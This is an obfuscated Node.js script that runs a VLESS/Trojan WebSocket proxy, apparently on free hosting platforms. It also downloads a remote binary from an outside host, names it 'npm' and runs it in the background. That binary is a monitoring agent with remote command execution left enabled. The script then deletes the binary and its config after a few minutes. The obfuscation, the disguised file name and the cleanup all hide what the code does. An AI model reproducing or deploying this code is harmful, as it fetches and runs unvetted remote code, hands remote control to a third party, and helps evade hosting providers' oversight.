const _0x4d7ea6=_0x2ffa;(function(_0x529aa5,_0x51ea76){const _0x561dc6=_0x2ffa,_0x5cd740=_0x529aa5();while(!![]){try{const _0xc072f5=-parseInt(_0x561dc6(0x12d))/0x1*(parseInt(_0x561dc6(0x172))/0x2)+parseInt(_0x561dc6(0x14f))/0x3*(parseInt(_0x561dc6(0x131))/0x4)+-parseInt(_0x561dc6(0x19b))/0x5+parseInt(_0x561dc6(0x135))/0x6+-parseInt(_0x561dc6(0x16a))/0x7*(parseInt(_0x561dc6(0x151))/0x8)+parseInt(_0x561dc6(0x17c))/0x9+parseInt(_0x561dc6(0x152))/0xa*(parseInt(_0x561dc6(0x184))/0xb);if(_0xc072f5===_0x51ea76)break;else _0x5cd740['push'](_0x5cd740['shift']());}catch(_0x52497c){_0x5cd740['push'](_0x5cd740['shift']());}}}(_0x46ce,0x4ccba));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4d7ea6(0x197)][_0x4d7ea6(0x163)]||_0x4d7ea6(0x155),NEZHA_SERVER=process[_0x4d7ea6(0x197)][_0x4d7ea6(0x14e)]||'',NEZHA_PORT=process[_0x4d7ea6(0x197)][_0x4d7ea6(0x195)]||'',NEZHA_KEY=process[_0x4d7ea6(0x197)][_0x4d7ea6(0x138)]||'',DOMAIN=process['env'][_0x4d7ea6(0x161)]||_0x4d7ea6(0x17d),AUTO_ACCESS=process[_0x4d7ea6(0x197)][_0x4d7ea6(0x164)]||!![],WSPATH=process[_0x4d7ea6(0x197)][_0x4d7ea6(0x175)]||UUID[_0x4d7ea6(0x133)](0x0,0x8),SUB_PATH=process[_0x4d7ea6(0x197)][_0x4d7ea6(0x160)]||_0x4d7ea6(0x157),NAME=process['env'][_0x4d7ea6(0x15f)]||_0x4d7ea6(0x165),PORT=process['env'][_0x4d7ea6(0x159)]||0x1eb4;let ISP='';function _0x2ffa(_0x1c3555,_0x41b862){_0x1c3555=_0x1c3555-0x12d;const _0x46ce31=_0x46ce();let _0x2ffa25=_0x46ce31[_0x1c3555];return _0x2ffa25;}const GetISP=async()=>{const _0x56acdb=_0x4d7ea6;try{const _0x3ed87a=await axios['get']('https://speed.cloudflare.com/meta'),_0x2f19e1=_0x3ed87a[_0x56acdb(0x17e)];ISP=(_0x2f19e1[_0x56acdb(0x13a)]+'-'+_0x2f19e1[_0x56acdb(0x145)])[_0x56acdb(0x1a3)](/ /g,'_');}catch(_0x4ff0c0){ISP='Unknown';}};GetISP();const httpServer=http[_0x4d7ea6(0x18f)]((_0x32c418,_0x1a8f51)=>{const _0x41cfaf=_0x4d7ea6;if(_0x32c418['url']==='/'){const _0x13ef1a=path[_0x41cfaf(0x17f)](__dirname,'index.html');fs['readFile'](_0x13ef1a,_0x41cfaf(0x16b),(_0x10ab14,_0x32241d)=>{const _0x2a9aeb=_0x41cfaf;if(_0x10ab14){_0x1a8f51['writeHead'](0xc8,{'Content-Type':_0x2a9aeb(0x176)}),_0x1a8f51[_0x2a9aeb(0x132)](_0x2a9aeb(0x16f));return;}_0x1a8f51[_0x2a9aeb(0x141)](0xc8,{'Content-Type':_0x2a9aeb(0x176)}),_0x1a8f51[_0x2a9aeb(0x132)](_0x32241d);});return;}else{if(_0x32c418[_0x41cfaf(0x134)]==='/'+SUB_PATH){const _0x539153=_0x41cfaf(0x146)+UUID+'@'+DOMAIN+_0x41cfaf(0x1a1)+DOMAIN+_0x41cfaf(0x137)+DOMAIN+_0x41cfaf(0x177)+WSPATH+'#'+NAME+'-'+ISP,_0x1e990e=_0x41cfaf(0x14c)+UUID+'@'+DOMAIN+_0x41cfaf(0x179)+DOMAIN+_0x41cfaf(0x137)+DOMAIN+_0x41cfaf(0x177)+WSPATH+'#'+NAME+'-'+ISP,_0x2c4a3f=_0x539153+'\x0a'+_0x1e990e,_0x1f7099=Buffer['from'](_0x2c4a3f)[_0x41cfaf(0x16c)](_0x41cfaf(0x15e));_0x1a8f51[_0x41cfaf(0x141)](0xc8,{'Content-Type':_0x41cfaf(0x15a)}),_0x1a8f51[_0x41cfaf(0x132)](_0x1f7099+'\x0a');}else _0x1a8f51[_0x41cfaf(0x141)](0x194,{'Content-Type':'text/plain'}),_0x1a8f51[_0x41cfaf(0x132)](_0x41cfaf(0x183));}}),wss=new WebSocket[(_0x4d7ea6(0x14b))]({'server':httpServer}),uuid=UUID[_0x4d7ea6(0x1a3)](/-/g,''),DNS_SERVERS=[_0x4d7ea6(0x15b),_0x4d7ea6(0x189)];function resolveHost(_0x176c66){return new Promise((_0x42733e,_0x5c05b7)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x176c66)){_0x42733e(_0x176c66);return;}let _0x477504=0x0;function _0x4e41be(){const _0x577e9b=_0x2ffa;if(_0x477504>=DNS_SERVERS[_0x577e9b(0x130)]){_0x5c05b7(new Error(_0x577e9b(0x194)+_0x176c66+_0x577e9b(0x199)));return;}const _0x49d73c=DNS_SERVERS[_0x477504];_0x477504++;const _0x14a402='https://dns.google/resolve?name='+encodeURIComponent(_0x176c66)+_0x577e9b(0x174);axios[_0x577e9b(0x198)](_0x14a402,{'timeout':0x1388,'headers':{'Accept':_0x577e9b(0x16d)}})[_0x577e9b(0x188)](_0x49b732=>{const _0x1d9b0a=_0x577e9b,_0x31a677=_0x49b732['data'];if(_0x31a677['Status']===0x0&&_0x31a677[_0x1d9b0a(0x171)]&&_0x31a677[_0x1d9b0a(0x171)][_0x1d9b0a(0x130)]>0x0){const _0x5a7260=_0x31a677[_0x1d9b0a(0x171)][_0x1d9b0a(0x13c)](_0x358a7c=>_0x358a7c[_0x1d9b0a(0x169)]===0x1);if(_0x5a7260){_0x42733e(_0x5a7260['data']);return;}}_0x4e41be();})[_0x577e9b(0x15c)](_0x268c13=>{_0x4e41be();});}_0x4e41be();});}function handleVlessConnection(_0x57e835,_0x395bf7){const _0x5611b2=_0x4d7ea6,[_0x3a198b]=_0x395bf7,_0x4eff54=_0x395bf7[_0x5611b2(0x133)](0x1,0x11);if(!_0x4eff54[_0x5611b2(0x1a2)]((_0x14db89,_0x88ff53)=>_0x14db89==parseInt(uuid[_0x5611b2(0x193)](_0x88ff53*0x2,0x2),0x10)))return![];let _0x524a12=_0x395bf7[_0x5611b2(0x133)](0x11,0x12)[_0x5611b2(0x14d)]()+0x13;const _0x3a085d=_0x395bf7[_0x5611b2(0x133)](_0x524a12,_0x524a12+=0x2)[_0x5611b2(0x185)](0x0),_0x39c271=_0x395bf7[_0x5611b2(0x133)](_0x524a12,_0x524a12+=0x1)[_0x5611b2(0x14d)](),_0x5afbca=_0x39c271==0x1?_0x395bf7[_0x5611b2(0x133)](_0x524a12,_0x524a12+=0x4)['join']('.'):_0x39c271==0x2?new TextDecoder()[_0x5611b2(0x168)](_0x395bf7[_0x5611b2(0x133)](_0x524a12+0x1,_0x524a12+=0x1+_0x395bf7['slice'](_0x524a12,_0x524a12+0x1)['readUInt8']())):_0x39c271==0x3?_0x395bf7[_0x5611b2(0x133)](_0x524a12,_0x524a12+=0x10)[_0x5611b2(0x13e)]((_0x54c212,_0x40f5f0,_0x308b2a,_0x1d5c2d)=>_0x308b2a%0x2?_0x54c212[_0x5611b2(0x154)](_0x1d5c2d[_0x5611b2(0x133)](_0x308b2a-0x1,_0x308b2a+0x1)):_0x54c212,[])[_0x5611b2(0x17a)](_0xfb2fff=>_0xfb2fff[_0x5611b2(0x185)](0x0)[_0x5611b2(0x16c)](0x10))[_0x5611b2(0x17f)](':'):'';_0x57e835[_0x5611b2(0x13b)](new Uint8Array([_0x3a198b,0x0]));const _0x1e9d79=createWebSocketStream(_0x57e835);return resolveHost(_0x5afbca)[_0x5611b2(0x188)](_0x289cc3=>{const _0x192965=_0x5611b2;net[_0x192965(0x19e)]({'host':_0x289cc3,'port':_0x3a085d},function(){const _0x75f8d0=_0x192965;this['write'](_0x395bf7[_0x75f8d0(0x133)](_0x524a12)),_0x1e9d79['on'](_0x75f8d0(0x187),()=>{})[_0x75f8d0(0x150)](this)['on'](_0x75f8d0(0x187),()=>{})[_0x75f8d0(0x150)](_0x1e9d79);})['on'](_0x192965(0x187),()=>{});})[_0x5611b2(0x15c)](_0x275f00=>{const _0x8d1c70=_0x5611b2;net['connect']({'host':_0x5afbca,'port':_0x3a085d},function(){const _0x5b259c=_0x2ffa;this[_0x5b259c(0x1a0)](_0x395bf7[_0x5b259c(0x133)](_0x524a12)),_0x1e9d79['on'](_0x5b259c(0x187),()=>{})[_0x5b259c(0x150)](this)['on'](_0x5b259c(0x187),()=>{})[_0x5b259c(0x150)](_0x1e9d79);})['on'](_0x8d1c70(0x187),()=>{});}),!![];}function handleTrojanConnection(_0x40efd6,_0x553fa0){const _0xb3399=_0x4d7ea6;try{if(_0x553fa0[_0xb3399(0x130)]<0x3a)return![];const _0xf79e71=_0x553fa0[_0xb3399(0x133)](0x0,0x38)['toString'](),_0x59e414=[UUID];let _0x1c0938=null;for(const _0x2c7e6c of _0x59e414){const _0x314186=crypto['createHash'](_0xb3399(0x186))['update'](_0x2c7e6c)[_0xb3399(0x144)](_0xb3399(0x17b));if(_0x314186===_0xf79e71){_0x1c0938=_0x2c7e6c;break;}}if(!_0x1c0938)return![];let _0x5a53c7=0x38;_0x553fa0[_0x5a53c7]===0xd&&_0x553fa0[_0x5a53c7+0x1]===0xa&&(_0x5a53c7+=0x2);const _0x17f664=_0x553fa0[_0x5a53c7];if(_0x17f664!==0x1)return![];_0x5a53c7+=0x1;const _0x3a53ec=_0x553fa0[_0x5a53c7];_0x5a53c7+=0x1;let _0x1c2ced,_0x3ba69d;if(_0x3a53ec===0x1)_0x1c2ced=_0x553fa0['slice'](_0x5a53c7,_0x5a53c7+0x4)[_0xb3399(0x17f)]('.'),_0x5a53c7+=0x4;else{if(_0x3a53ec===0x3){const _0x4e71c5=_0x553fa0[_0x5a53c7];_0x5a53c7+=0x1,_0x1c2ced=_0x553fa0[_0xb3399(0x133)](_0x5a53c7,_0x5a53c7+_0x4e71c5)[_0xb3399(0x16c)](),_0x5a53c7+=_0x4e71c5;}else{if(_0x3a53ec===0x4)_0x1c2ced=_0x553fa0[_0xb3399(0x133)](_0x5a53c7,_0x5a53c7+0x10)[_0xb3399(0x13e)]((_0x395a35,_0x1e00fe,_0x3d617e,_0x5cade8)=>_0x3d617e%0x2?_0x395a35[_0xb3399(0x154)](_0x5cade8[_0xb3399(0x133)](_0x3d617e-0x1,_0x3d617e+0x1)):_0x395a35,[])[_0xb3399(0x17a)](_0x3f56cf=>_0x3f56cf[_0xb3399(0x185)](0x0)[_0xb3399(0x16c)](0x10))[_0xb3399(0x17f)](':'),_0x5a53c7+=0x10;else return![];}}_0x3ba69d=_0x553fa0[_0xb3399(0x185)](_0x5a53c7),_0x5a53c7+=0x2;_0x5a53c7<_0x553fa0[_0xb3399(0x130)]&&_0x553fa0[_0x5a53c7]===0xd&&_0x553fa0[_0x5a53c7+0x1]===0xa&&(_0x5a53c7+=0x2);const _0x407537=createWebSocketStream(_0x40efd6);return resolveHost(_0x1c2ced)[_0xb3399(0x188)](_0x47051a=>{const _0x3b64a5=_0xb3399;net['connect']({'host':_0x47051a,'port':_0x3ba69d},function(){const _0x2b7913=_0x2ffa;_0x5a53c7<_0x553fa0[_0x2b7913(0x130)]&&this[_0x2b7913(0x1a0)](_0x553fa0[_0x2b7913(0x133)](_0x5a53c7)),_0x407537['on'](_0x2b7913(0x187),()=>{})['pipe'](this)['on'](_0x2b7913(0x187),()=>{})[_0x2b7913(0x150)](_0x407537);})['on'](_0x3b64a5(0x187),()=>{});})[_0xb3399(0x15c)](_0x1bbc27=>{const _0x16f4ae=_0xb3399;net['connect']({'host':_0x1c2ced,'port':_0x3ba69d},function(){const _0x2d013c=_0x2ffa;_0x5a53c7<_0x553fa0[_0x2d013c(0x130)]&&this[_0x2d013c(0x1a0)](_0x553fa0[_0x2d013c(0x133)](_0x5a53c7)),_0x407537['on'](_0x2d013c(0x187),()=>{})[_0x2d013c(0x150)](this)['on'](_0x2d013c(0x187),()=>{})['pipe'](_0x407537);})['on'](_0x16f4ae(0x187),()=>{});}),!![];}catch(_0x1f7b78){return![];}}wss['on']('connection',(_0x11b6c9,_0x3a27dc)=>{const _0x3dcba5=_0x4d7ea6,_0x18380c=_0x3a27dc[_0x3dcba5(0x134)]||'';_0x11b6c9[_0x3dcba5(0x173)]('message',_0x30de4b=>{const _0x49c113=_0x3dcba5;if(_0x30de4b[_0x49c113(0x130)]>0x11&&_0x30de4b[0x0]===0x0){const _0x33fe20=_0x30de4b[_0x49c113(0x133)](0x1,0x11),_0x1289a0=_0x33fe20[_0x49c113(0x1a2)]((_0x510d72,_0x368f29)=>_0x510d72==parseInt(uuid['substr'](_0x368f29*0x2,0x2),0x10));if(_0x1289a0){!handleVlessConnection(_0x11b6c9,_0x30de4b)&&_0x11b6c9[_0x49c113(0x158)]();return;}}!handleTrojanConnection(_0x11b6c9,_0x30de4b)&&_0x11b6c9[_0x49c113(0x158)]();})['on'](_0x3dcba5(0x187),()=>{});});function _0x46ce(){const _0x2fa8a2=['unlink','error:\x20','stream','substr','Failed\x20to\x20resolve\x20','NEZHA_PORT','https://amd64.ssss.nyc.mn/agent','env','get','\x20with\x20all\x20DNS\x20servers','npm','752410iJwSlF','https://','npm\x20is\x20running','connect','includes','write',':443?encryption=none&security=tls&sni=','every','replace','811CRybEP','client_secret:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','length','404ooNFov','end','slice','url','310026djKebg','/bin/bash','&fp=chrome&type=ws&host=','NEZHA_KEY','log','country','send','find','chmod\x20+x\x20npm','reduce','2096','2053','writeHead','npm\x20is\x20already\x20running,\x20skip\x20running...','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','digest','asOrganization','vless://','--tls','trim','npm\x20download\x20successfully','Automatic\x20Access\x20Task\x20added\x20successfully','Server','trojan://','readUInt8','NEZHA_SERVER','2469rHqMaS','pipe','44592PNRVuM','4073010alxNWX','setsid\x20nohup\x20./npm\x20-s\x20','concat','d33e032e-290f-4bb7-aeba-7dc22c0e5f2f','pop','sub','close','PORT','text/plain','8.8.4.4','catch','https://arm64.ssss.nyc.mn/v1','base64','NAME','SUB_PATH','DOMAIN','false','UUID','AUTO_ACCESS','Hug','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https://arm64.ssss.nyc.mn/agent','decode','type','679psGJCc','utf8','toString','application/dns-json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Hello\x20world!','true','Answer','446rCYfVR','once','&type=A','WSPATH','text/html','&path=%2F','utf-8',':443?security=tls&sni=','map','hex','2134539HPWPUu','1234.abc.com','data','join','\x20-p\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','application/json','Not\x20Found\x0a','22NsvQYO','readUInt16BE','sha224','error','then','1.1.1.1','npm\x20running\x20error:','https://amd64.ssss.nyc.mn/v1','createWriteStream','2083','finish','createServer'];_0x46ce=function(){return _0x2fa8a2;};return _0x46ce();}const getDownloadUrl=()=>{const _0x1215d8=_0x4d7ea6,_0x5bfa1d=os['arch']();return _0x5bfa1d==='arm'||_0x5bfa1d==='arm64'||_0x5bfa1d==='aarch64'?!NEZHA_PORT?_0x1215d8(0x15d):_0x1215d8(0x167):!NEZHA_PORT?_0x1215d8(0x18b):_0x1215d8(0x196);},downloadFile=async()=>{const _0xe9f883=_0x4d7ea6;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x53c464=getDownloadUrl(),_0x1c0a95=await axios({'method':_0xe9f883(0x198),'url':_0x53c464,'responseType':_0xe9f883(0x192)}),_0x314f4c=fs[_0xe9f883(0x18c)]('npm');return _0x1c0a95['data']['pipe'](_0x314f4c),new Promise((_0x25c8fe,_0x59be4a)=>{const _0x599e98=_0xe9f883;_0x314f4c['on'](_0x599e98(0x18e),()=>{const _0x272d4a=_0x599e98;console['log'](_0x272d4a(0x149)),exec(_0x272d4a(0x13d),_0x33656a=>{if(_0x33656a)_0x59be4a(_0x33656a);_0x25c8fe();});}),_0x314f4c['on'](_0x599e98(0x187),_0x59be4a);});}catch(_0x365ada){throw _0x365ada;}},runnz=async()=>{const _0x1b0d50=_0x4d7ea6;try{const _0x3dfe33=execSync(_0x1b0d50(0x143),{'encoding':_0x1b0d50(0x178)});if(_0x3dfe33[_0x1b0d50(0x148)]()!==''){console[_0x1b0d50(0x139)](_0x1b0d50(0x142));return;}}catch(_0x58fda0){}await downloadFile();let _0xa095f='',_0x3e90e9=['443','8443',_0x1b0d50(0x13f),'2087',_0x1b0d50(0x18d),_0x1b0d50(0x140)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x793e13=_0x3e90e9[_0x1b0d50(0x19f)](NEZHA_PORT)?_0x1b0d50(0x147):'';_0xa095f=_0x1b0d50(0x153)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1b0d50(0x180)+NEZHA_KEY+'\x20'+_0x793e13+_0x1b0d50(0x181);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1aefa0=NEZHA_SERVER[_0x1b0d50(0x19f)](':')?NEZHA_SERVER['split'](':')[_0x1b0d50(0x156)]():'',_0x275865=_0x3e90e9[_0x1b0d50(0x19f)](_0x1aefa0)?_0x1b0d50(0x170):_0x1b0d50(0x162),_0x3398dc=_0x1b0d50(0x12e)+NEZHA_KEY+_0x1b0d50(0x16e)+NEZHA_SERVER+_0x1b0d50(0x166)+_0x275865+_0x1b0d50(0x12f)+UUID;fs['writeFileSync']('config.yaml',_0x3398dc);}_0xa095f='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x1b0d50(0x139)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0xa095f,{'shell':_0x1b0d50(0x136)},_0x3cb78a=>{const _0x50b578=_0x1b0d50;if(_0x3cb78a)console[_0x50b578(0x187)](_0x50b578(0x18a),_0x3cb78a);else console['log'](_0x50b578(0x19d));});}catch(_0x4cf466){console[_0x1b0d50(0x187)](_0x1b0d50(0x191)+_0x4cf466);}};async function addAccessTask(){const _0xc19077=_0x4d7ea6;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x516240=_0xc19077(0x19c)+DOMAIN;try{const _0x3b902b=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0x516240},{'headers':{'Content-Type':_0xc19077(0x182)}});console[_0xc19077(0x139)](_0xc19077(0x14a));}catch(_0xb490df){}}const delFiles=()=>{const _0x5789c9=_0x4d7ea6;fs['unlink'](_0x5789c9(0x19a),()=>{}),fs[_0x5789c9(0x190)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x449b5a=_0x4d7ea6;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x449b5a(0x139)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
